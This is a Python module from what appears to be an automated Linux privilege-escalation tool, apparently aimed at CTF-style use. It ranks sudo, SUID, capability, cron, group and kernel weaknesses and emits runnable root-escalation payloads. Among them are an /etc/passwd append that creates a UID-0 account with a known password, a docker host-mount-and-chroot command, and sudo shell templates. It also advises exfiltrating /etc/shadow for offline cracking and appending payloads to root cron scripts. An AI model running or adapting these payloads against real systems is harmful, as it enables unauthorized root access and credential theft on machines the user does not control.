"""Deterministic rule engine: turn enumeration output into ranked vectors."""
from __future__ import annotations

import re
from dataclasses import dataclass

from . import gtfobins as g
from .enumerate import EnumResult

PATH_RE = re.compile(r"/[\w./-]+")
RUNAS_RE = re.compile(r"\(([^)]*)\)")

# Standard SUID binaries that are not useful escalation vectors on their own.
STD_SUID = {
    "mount", "umount", "su", "sudo", "passwd", "chsh", "chfn", "newgrp",
    "gpasswd", "fusermount", "fusermount3", "ssh-keysign", "chage", "expiry",
    "dbus-daemon-launch-helper", "vmware-user-suid-wrapper", "polkit-agent-helper-1",
    "ntfs-3g", "Xorg", "crontab", "dotlockfile", "ssh-agent", "unix_chkpwd",
    "pppd", "wall", "write", "bsd-write", "login",
}
# SUID binaries with a specific well-known CVE worth calling out as a lead.
SUID_CVE = {"pkexec": "pkexec -> PwnKit (CVE-2021-4034) local root"}


@dataclass
class Vector:
    kind: str
    title: str
    confidence: str          # high | medium | low
    effect: str              # exec | read | tick | lead
    template: str | None     # exec: has {cmd}; read/tick: literal; lead: None
    runas: str = "root"
    target: str = ""         # tick: script path to append to
    note: str = ""
    runner: str | None = None  # exec: shell-runner template (@SQ@/@DQ@) if available
    severity: str = "medium"   # critical | high | medium | low

    @property
    def auto(self) -> bool:
        return self.effect in ("exec", "read", "tick") and self.template is not None


def severity_of(v: "Vector") -> str:
    k, t = v.kind, v.title.lower()
    if k in ("sudo-all", "suid", "cap", "writable-passwd", "group") or (k == "sudo" and v.runas == "root"):
        return "critical"
    if k in ("sudo", "sudo-all"):          # sudo to another user = lateral
        return "high"
    if k in ("suid-read", "cap-read", "sudo-read", "cron", "sudo-env"):
        return "high"
    if k == "lead":
        if "pwnkit" in t or "pkexec" in t:
            return "critical"
        if "shadow" in t or "passwd" in t or "preload" in t or "env_keep" in t:
            return "high"
        if "kernel" in t:
            return "low"
        return "medium"
    return {"high": "high", "medium": "medium", "low": "low"}.get(v.confidence, "medium")


def _paths(blob: str) -> list[str]:
    return PATH_RE.findall(blob)


def _basename(path: str) -> str:
    return path.rsplit("/", 1)[-1]


def _norm(name: str) -> str:
    # python3.9 -> python3 -> python ; keep known interpreter roots
    for root in ("python3", "python2", "python", "lua5.1", "perl", "ruby", "node", "php"):
        if name.startswith(root):
            return root if root in ("python3", "python2", "python") else name
    return name.rstrip("0123456789.") if name[-1:].isdigit() else name


def _sudo_vectors(enum: EnumResult) -> list[Vector]:
    out: list[Vector] = []
    sudo = enum.get("SUDO")
    if not sudo:
        return out

    # LD_PRELOAD / LD_LIBRARY_PATH kept across sudo -> classic .so injection.
    if re.search(r"env_keep\+?=.*LD_(PRELOAD|LIBRARY_PATH)", sudo):
        out.append(Vector("sudo-env", "sudo env_keep LD_PRELOAD -> root", "medium",
                          "lead", None, note="Compile a malicious .so and set "
                          "LD_PRELOAD across a NOPASSWD sudo command."))

    only_cmds = sudo.split("may run the following", 1)[-1]
    for line in only_cmds.splitlines():
        if "(" not in line and "/" not in line:
            continue
        m = RUNAS_RE.search(line)
        runas_raw = (m.group(1) if m else "root").strip()
        runas = "root" if ("ALL" in runas_raw or "root" in runas_raw) else runas_raw.split(":")[0].split(",")[0].strip()

        sudo_pfx = "sudo " if runas == "root" else f"sudo -u {runas} "

        # full sudo
        if re.search(r"\)\s*(NOPASSWD:\s*)?ALL\s*$", line):
            payload = "sudo {ru}/bin/sh -c '{cmd}'".replace("{ru}", "" if runas == "root" else f"-u {runas} ")
            out.append(Vector("sudo-all", f"Unrestricted sudo as {runas}", "high",
                              "exec", payload, runas=runas,
                              runner=f"{sudo_pfx}/bin/sh -c @SQ@",
                              note=f"May run any command via sudo as {runas}."))
            continue

        conf = "high" if "NOPASSWD" in line else "medium"
        for path in _paths(line):
            name = _norm(_basename(path))
            if name in g.SUDO_EXEC and g.SUDO_EXEC[name]:
                out.append(Vector("sudo", f"sudo {name} -> {runas} (GTFOBins)", conf,
                                  "exec", g.render(g.SUDO_EXEC[name], path, "{cmd}", runas=runas),
                                  runas=runas, runner=g.runner("sudo", name, path, sudo_pfx),
                                  note=f"{name} runs arbitrary commands via sudo."))
            elif name in g.SUDO_WRITE and g.SUDO_WRITE[name] and runas == "root":
                out.append(Vector("sudo", f"sudo {name} (write) -> root", conf,
                                  "exec", g.render(g.SUDO_WRITE[name], path, "{cmd}"),
                                  note=f"{name} write primitive -> SUID bash."))
            elif name in g.SUDO_READ and g.SUDO_READ[name] and runas == "root":
                out.append(Vector("sudo-read", f"sudo {name} -> read root files", conf,
                                  "read", g.render(g.SUDO_READ[name], path),
                                  note=f"{name} reads privileged files; capture flags."))
            elif name in g.SUDO_EXEC and g.SUDO_EXEC[name] is None:
                out.append(Vector("lead", f"sudo {name} (needs tty / known GTFOBins)",
                                  "low", "lead", None, runas=runas))
    return out


def _suid_sgid_vectors(enum: EnumResult) -> list[Vector]:
    out: list[Vector] = []
    for path in _paths(enum.get("SUID")):
        name = _basename(path)
        norm = _norm(name)
        if norm in g.SUID_EXEC and g.SUID_EXEC[norm]:
            out.append(Vector("suid", f"SUID {name} -> root (GTFOBins)", "high",
                              "exec", g.render(g.SUID_EXEC[norm], path, "{cmd}"),
                              runner=g.runner("suid", norm, path),
                              note=f"{path} runs with euid 0."))
        elif norm in g.SUID_READ and g.SUID_READ[norm]:
            out.append(Vector("suid-read", f"SUID {name} -> read root files", "high",
                              "read", g.render(g.SUID_READ[norm], path),
                              note=f"{path} reads files as root."))
        elif name in SUID_CVE:
            out.append(Vector("lead", SUID_CVE[name], "medium", "lead", None,
                              note="Public local-root exploit exists."))
        elif norm not in STD_SUID:
            out.append(Vector("lead", f"custom SUID binary {path}", "medium", "lead",
                              None, target=path,
                              note="Non-standard SUID binary; analyze strings/PATH/injection."))
    return out


def _cap_vectors(enum: EnumResult) -> list[Vector]:
    out: list[Vector] = []
    for line in enum.get("CAPS").splitlines():
        low = line.lower()
        for path in _paths(line):
            name = _norm(_basename(path))
            if "cap_setuid" in low and name in g.CAP_SETUID:
                out.append(Vector("cap", f"cap_setuid {name} -> root", "high",
                                  "exec", g.render(g.CAP_SETUID[name], path, "{cmd}"),
                                  runner=g.runner("cap", name, path),
                                  note=f"{path} can setuid(0)."))
            elif ("cap_dac_read_search" in low or "cap_dac_override" in low) and name in g.CAP_DAC_READ:
                out.append(Vector("cap-read", f"cap_dac {name} -> read root files", "high",
                                  "read", g.render(g.CAP_DAC_READ[name], path),
                                  note=f"{path} can read any file."))
    return out


def _misc_vectors(enum: EnumResult) -> list[Vector]:
    out: list[Vector] = []
    if "WRITABLE" in enum.get("PASSWD_W"):
        payload = ("echo 'r00t:$1$x$7Dan0ZXiL1CxWJ3iN2YJj1:0:0::/root:/bin/sh'"
                   ">>/etc/passwd && su r00t -c '{cmd}'")
        out.append(Vector("writable-passwd", "/etc/passwd writable -> add UID-0 user",
                          "high", "exec", payload,
                          note="Append root user (password 'pw') and su."))
    if "READABLE" in enum.get("SHADOW_R"):
        out.append(Vector("lead", "/etc/shadow readable -> offline crack", "medium",
                          "lead", None, note="Exfil and crack with hashcat/john."))

    for script in enum.get("WRITABLE_ROOT_SCRIPTS").splitlines():
        script = script.strip()
        if script:
            out.append(Vector("cron", f"writable root cron script {script}", "high",
                              "tick", "APPEND", target=script,
                              note="Append a payload; root cron executes it."))

    # dangerous group memberships
    for grp in enum.groups:
        if grp in g.GROUP_VECTORS:
            tmpl = g.GROUP_VECTORS[grp]
            if tmpl and grp == "docker":
                out.append(Vector("group", "member of docker group -> root", "high",
                                  "exec", tmpl,
                                  runner="docker run -v /:/mnt --rm alpine chroot /mnt /bin/sh -c @SQ@",
                                  note="Mount host / into a container as root."))
            else:
                out.append(Vector("lead", f"member of '{grp}' group", "medium", "lead",
                                  None, note=f"Group '{grp}' enables a known escalation."))

    kern = enum.get("KERNEL")
    if kern:
        out.append(Vector("lead", f"kernel {kern} -> check public exploits", "low",
                          "lead", None, note=f"searchsploit linux kernel {kern}."))
    for key in enum.get("READKEYS").splitlines():
        if key.strip():
            out.append(Vector("lead", f"readable private key {key.strip()}", "medium",
                              "lead", None, note="Try it for lateral/root SSH."))
    return out


def analyze(enum: EnumResult) -> list[Vector]:
    vectors = (_sudo_vectors(enum) + _suid_sgid_vectors(enum)
               + _cap_vectors(enum) + _misc_vectors(enum))
    # rank: root exec/read first, then lateral exec, then ticks, then leads
    order = {"high": 0, "medium": 1, "low": 2}

    def rank(v: Vector):
        auto = 0 if v.auto else 1
        root_first = 0 if v.runas == "root" else 1
        tick_last = 1 if v.effect == "tick" else 0
        return (auto, tick_last, root_first, order.get(v.confidence, 3))

    vectors.sort(key=rank)
    for v in vectors:
        v.severity = severity_of(v)
    return vectors
